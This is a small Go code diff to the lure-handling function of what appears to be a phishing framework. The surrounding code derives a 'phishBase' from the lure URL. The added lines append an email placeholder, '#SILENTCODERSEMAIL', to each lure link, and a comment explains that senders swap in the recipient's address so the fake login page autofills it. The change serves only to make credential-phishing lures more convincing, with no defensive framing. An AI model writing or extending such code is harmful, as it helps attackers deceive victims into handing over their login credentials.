@@ -1237,6 +1237,9 @@ func (t *Terminal) handleLures(args []string) error {
 					}
 					finalURL = purl
 				}
+				// Append autofill placeholder — sender replaces SILENTCODERSEMAIL
+				// with the recipient's email so the login page autofills on arrival.
+				finalURL += "#SILENTCODERSEMAIL"
 
 				// Derive phishBase from finalURL so we always use the correct subdomain.
 				parsedFinal, err := url.Parse(finalURL)
